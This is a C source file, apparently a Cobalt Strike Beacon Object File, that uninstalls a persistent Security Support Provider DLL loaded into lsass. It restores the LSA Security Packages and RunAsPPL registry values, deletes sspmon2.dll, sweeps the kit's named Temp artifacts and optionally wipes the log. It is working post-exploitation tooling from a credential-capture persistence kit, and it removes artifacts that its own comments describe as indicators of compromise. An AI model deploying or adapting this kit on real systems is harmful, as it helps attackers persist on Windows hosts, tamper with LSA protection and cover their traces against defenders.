// ssp_remove.c — uninstall the persistent SSP AND RESTORE ORIGINAL STATE:
//   1. restore Security Packages + RunAsPPL from the install-time snapshot
//      (C:\Windows\Temp\sst.bin) — original bytes re-created, or value deleted
//      if it was originally absent. Fallbacks if snapshot lost:
//        /ppl:<n>    set RunAsPPL to <n> manually (e.g. /ppl:2)
//        (otherwise Security Packages is deleted, PPL left untouched)
//   2. delete System32\sspmon2.dll (deferred to next boot while lsass-loaded)
//   3. sweep Temp artifacts. ssp.log is KEPT unless /wipe-log — and with
//      /wipe-log the log is DUMPED TO CONSOLE first so evidence survives.
//
// Args: none | "/wipe-log" | "/ppl:<decimal>"
#include "ssp_bof.h"

static void DeleteTemp(const wchar_t* name)
{
    wchar_t p[MAX_PATH];
    p[0] = 0;
    const wchar_t* t = L"%SystemRoot%\\Temp\\";
    int i = 0; while (t[i]) { p[i] = t[i]; i++; }
    int j = 0; while (name[j]) { p[i++] = name[j++]; }
    p[i] = 0;
    wchar_t exp[MAX_PATH];
    if (!SSP_Expand(p, exp, MAX_PATH)) return;
    if (DeleteFileW(exp))
    {
        SSP_OutA("[+] deleted Temp\\"); SSP_OutW(name); SSP_OutA("\n");
    }
}

DECLSPEC_EXPORT void go(char* args, int len)
{
    datap parser;
    int alen = 0;
    BOOL wipeLog = FALSE, useManualPpl = FALSE;
    DWORD manualPpl = 0;

    BeaconDataParse(&parser, args, len);
    for (;;)
    {
        char* a = BeaconDataExtract(&parser, &alen);
        if (!a) break;
        if (alen == 9 && a[0]=='/' && a[1]=='w' && a[2]=='i' && a[3]=='p' && a[4]=='e' && a[5]=='-' && a[6]=='l' && a[7]=='o' && a[8]=='g')
            wipeLog = TRUE;
        else if (alen > 5 && a[0]=='/' && a[1]=='p' && a[2]=='p' && a[3]=='l' && a[4]==':')
        {
            DWORD v = 0; BOOL any = FALSE;
            for (int i = 5; i < alen; i++)
            {
                if (a[i] < '0' || a[i] > '9') break;
                v = v * 10 + (DWORD)(a[i] - '0'); any = TRUE;
            }
            if (any) { manualPpl = v; useManualPpl = TRUE; }
        }
    }

    // 1. restore registry to original
    BOOL restored = FALSE;
    BOOL haveSnapshot = SSP_SnapshotRestore(manualPpl, useManualPpl, &restored);
    if (!haveSnapshot)
    {
        SSP_OutA("[*] No snapshot (Temp\\sst.bin missing) — fallback: delete Security Packages\n");
        HKEY k;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SSP_REG_KEY, 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS)
        {
            LONG r = RegDeleteValueW(k, SSP_REG_VALUE);
            if (r == ERROR_SUCCESS)           SSP_OutA("[+] Lsa\\Security Packages cleared\n");
            else if (r == ERROR_FILE_NOT_FOUND) SSP_OutA("[*] Lsa\\Security Packages already absent\n");
            else SSP_LastErr("RegDeleteValueW(Security Packages)");
            if (useManualPpl)
            {
                if (RegSetValueExW(k, SSP_REG_PPL, 0, REG_DWORD, (const BYTE*)&manualPpl, sizeof(DWORD)) == ERROR_SUCCESS)
                {
                    wchar_t b[24]; SSP_U64ToDecW(manualPpl, b);
                    SSP_OutA("[+] RunAsPPL manually set to: "); SSP_OutW(b); SSP_OutA("\n");
                }
                else SSP_LastErr("manual RegSetValueExW(RunAsPPL)");
            }
            else SSP_OutA("[*] RunAsPPL left untouched (pass /ppl:<n> to set it)\n");
            RegCloseKey(k);
        }
        else { SSP_LastErr("RegOpenKeyExW(Lsa) — need admin"); return; }
    }

    // 2. delete DLL (expected to fail while loaded — next boot)
    wchar_t dllPath[MAX_PATH];
    if (SSP_Expand(SSP_DLL_PATH, dllPath, MAX_PATH))
    {
        if (DeleteFileW(dllPath))
            SSP_OutA("[+] System32\\sspmon2.dll deleted (was not loaded)\n");
        else
        {
            DWORD e = (DWORD)GetLastError();
            if (e == 5)
                SSP_OutA("[*] DLL still loaded by lsass — delete next boot (registry already restored, safe to reboot)\n");
            else
                SSP_LastErr("DeleteFileW(dll)");
        }
    }

    // 3. Temp sweep (kit + trigger leftovers; snapshot + log handled separately)
    const wchar_t* sweep[] = {
        L"wtest.dll", L"sspload2.exe", L"sspload3.exe", L"sspload_out.txt",
        L"sspload_dbg.txt", L"setup_ssp.bat", L"trigger_ssp.bat", L"lsa.reg",
        L"tl.txt", L"trigger2.bat", L"trigger2.log", L"tl2.txt", NULL };
    for (int i = 0; sweep[i]; i++) DeleteTemp(sweep[i]);

    // 4. log: dump-then-wipe, or keep
    if (wipeLog)
    {
        SSP_OutA("[*] /wipe-log: dumping current log before deletion (evidence to console)\n");
        SSP_DumpLog();
        wchar_t logPath[MAX_PATH];
        if (SSP_Expand(SSP_LOG_PATH, logPath, MAX_PATH) && DeleteFileW(logPath))
            SSP_OutA("[+] Temp\\ssp.log wiped (contents preserved above)\n");
        else
            SSP_LastErr("DeleteFileW(ssp.log)");
    }
    else
        SSP_OutA("[*] Temp\\ssp.log KEPT (read it with the ssplog BOF; /wipe-log to destroy after dumping)\n");

    // 5. consume the snapshot — state is restored, snapshot is now an IOC
    if (haveSnapshot)
    {
        wchar_t snapPath[MAX_PATH];
        if (SSP_Expand(SSP_SNAP_PATH, snapPath, MAX_PATH) && DeleteFileW(snapPath))
            SSP_OutA("[+] Snapshot Temp\\sst.bin consumed and deleted\n");
    }

    SSP_OutA("[*] Uninstall complete. Reboot to unload the SSP from lsass.\n");
}
